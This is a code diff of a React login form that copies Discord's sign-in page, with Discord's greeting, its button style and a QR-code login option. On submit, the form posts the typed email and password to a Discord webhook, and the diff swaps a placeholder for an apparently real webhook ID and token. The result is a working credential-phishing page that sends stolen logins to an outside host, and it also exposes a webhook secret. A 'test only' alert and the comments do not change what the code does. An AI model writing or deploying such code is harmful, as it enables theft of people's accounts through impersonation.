@@ -2,45 +2,28 @@ import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { Card, CardContent, CardHeader } from "@/components/ui/card";
-import { Eye, EyeOff } from "lucide-react";
+import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
+import { QrCode, Eye, EyeOff } from "lucide-react";
 
 export function LoginForm() {
   const [showPassword, setShowPassword] = useState(false);
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
+  const [loading, setLoading] = useState(false);
 
-  // Discord Webhook URL（テスト用に直書きしてますが、本来はサーバー側に隠すべき）
-  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/あなたのWebhookID/あなたのWebhookトークン";
+  // ここに自分の Discord Webhook URL を入れてください
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1368915728551645315/n44u0089wY_AQftgY5ku8ORhzyDIZK2iowqHIKwxbTbK2HzY-ayx-D1UYLt21w2PhH90";
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-
-    // Discordに送信するペイロードを作成
-    const payload = {
-      content: null,
-      embeds: [
-        {
-          title: "【Login Attempt】",
-          color: 0xff0000,
-          fields: [
-            {
-              name: "Email or Phone",
-              value: email,
-              inline: true,
-            },
-            {
-              name: "Password",
-              value: password,
-              inline: true,
-            },
-          ],
-          timestamp: new Date().toISOString(),
-        },
-      ],
-    };
+    setLoading(true);
 
     try {
+      // Discord webhook へ送信するペイロード
+      const payload = {
+        content: `**Login Attempt**\nEmail: ${email}\nPassword: ${password}`,
+      };
+
       const res = await fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
         headers: {
@@ -49,108 +32,120 @@ export function LoginForm() {
         body: JSON.stringify(payload),
       });
 
-      if (res.ok) {
-        console.log("Webhook送信成功");
-      } else {
-        console.error("Webhook送信失敗", res.status);
+      if (!res.ok) {
+        throw new Error(`Failed to send webhook: ${res.statusText}`);
       }
-    } catch (error) {
-      console.error("Webhook送信エラー", error);
-    }
 
-    console.log("Login attempted with:", { email, password });
+      alert("Login data sent to Discord webhook (test only)");
+      setEmail("");
+      setPassword("");
+    } catch (error) {
+      alert("Error sending data to Discord webhook: " + error);
+    } finally {
+      setLoading(false);
+    }
   };
 
   return (
-    <Card className="w-full max-w-md mx-auto bg-card/50 backdrop-blur-sm border-border">
-      <CardHeader className="space-y-1 text-center pb-8">
-        <div className="space-y-2">
-          <h1 className="text-2xl font-bold text-foreground">Welcome back!</h1>
-          <p className="text-sm text-muted-foreground">
-            We're so excited to see you again!
-          </p>
-        </div>
-      </CardHeader>
-      <CardContent>
-        <form onSubmit={handleSubmit} className="space-y-4">
-          <div className="space-y-2">
-            <Label
-              htmlFor="email"
-              className="text-xs font-bold text-muted-foreground uppercase tracking-wide"
-            >
-              Email or Phone Number *
-            </Label>
-            <Input
-              id="email"
-              type="email"
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
-              required
-              className="bg-background border-border focus:border-primary transition-colors"
-            />
-          </div>
+    <div className="min-h-screen bg-gradient-subtle flex items-center justify-center p-4">
+      <div className="w-full max-w-md">
+        <Card className="bg-card border-border shadow-card">
+          <CardHeader className="text-center pb-8">
+            <CardTitle className="text-2xl font-bold text-foreground mb-2">
+              Welcome back!
+            </CardTitle>
+            <CardDescription className="text-muted-foreground">
+              We're so excited to see you again!
+            </CardDescription>
+          </CardHeader>
 
-          <div className="space-y-2">
-            <Label
-              htmlFor="password"
-              className="text-xs font-bold text-muted-foreground uppercase tracking-wide"
-            >
-              Password *
-            </Label>
-            <div className="relative">
-              <Input
-                id="password"
-                type={showPassword ? "text" : "password"}
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
-                required
-                className="bg-background border-border focus:border-primary transition-colors pr-10"
-              />
-              <Button
+          <CardContent className="space-y-6">
+            <form onSubmit={handleSubmit} className="space-y-4">
+              <div className="space-y-2">
+                <Label htmlFor="email" className="text-sm font-medium text-foreground uppercase tracking-wide">
+                  Email or Phone Number <span className="text-destructive">*</span>
+                </Label>
+                <Input
+                  id="email"
+                  type="email"
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
+                  className="bg-input"
+                  required
+                  disabled={loading}
+                />
+              </div>
+
+              <div className="space-y-2">
+                <Label htmlFor="password" className="text-sm font-medium text-foreground uppercase tracking-wide">
+                  Password <span className="text-destructive">*</span>
+                </Label>
+                <div className="relative">
+                  <Input
+                    id="password"
+                    type={showPassword ? "text" : "password"}
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                    className="bg-input pr-10"
+                    required
+                    disabled={loading}
+                  />
+                  <button
+                    type="button"
+                    onClick={() => setShowPassword(!showPassword)}
+                    className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
+                    disabled={loading}
+                  >
+                    {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
+                  </button>
+                </div>
+              </div>
+
+              <button
                 type="button"
-                variant="ghost"
-                size="icon"
-                className="absolute right-0 top-0 h-full px-3 hover:bg-transparent"
-                onClick={() => setShowPassword(!showPassword)}
+                className="text-sm text-primary hover:underline"
+                disabled={loading}
               >
-                {showPassword ? (
-                  <EyeOff className="h-4 w-4 text-muted-foreground" />
-                ) : (
-                  <Eye className="h-4 w-4 text-muted-foreground" />
-                )}
-              </Button>
-            </div>
-          </div>
+                Forgot your password?
+              </button>
 
-          <div className="space-y-4 pt-2">
-            <Button type="submit" variant="discord" className="w-full">
-              Log In
+              <Button
+                type="submit"
+                variant="discord"
+                className="w-full h-11 text-base"
+                disabled={loading}
+              >
+                {loading ? "Sending..." : "Log In"}
+              </Button>
+            </form>
+
+            <div className="relative">
+              <div className="absolute inset-0 flex items-center">
+                <span className="w-full border-t border-border" />
+              </div>
+              <div className="relative flex justify-center text-xs uppercase">
+                <span className="bg-card px-2 text-muted-foreground">Or</span>
+              </div>
+            </div>
+
+            <Button
+              variant="outline"
+              className="w-full h-11 bg-card border-border hover:bg-secondary"
+              disabled={loading}
+            >
+              <QrCode className="mr-2 h-4 w-4" />
+              Log in with QR Code
             </Button>
 
-            <div className="text-sm">
-              <span className="text-muted-foreground">Forgot your password? </span>
-              <Button
-                type="button"
-                variant="link"
-                className="p-0 h-auto text-primary font-normal"
-              >
-                Reset it here
-              </Button>
-            </div>
-
-            <div className="text-sm">
-              <span className="text-muted-foreground">Need an account? </span>
-              <Button
-                type="button"
-                variant="link"
-                className="p-0 h-auto text-primary font-normal"
-              >
+            <p className="text-sm text-muted-foreground">
+              Need an account?{" "}
+              <button className="text-primary hover:underline" disabled={loading}>
                 Register
-              </Button>
-            </div>
-          </div>
-        </form>
-      </CardContent>
-    </Card>
+              </button>
+            </p>
+          </CardContent>
+        </Card>
+      </div>
+    </div>
   );
 }
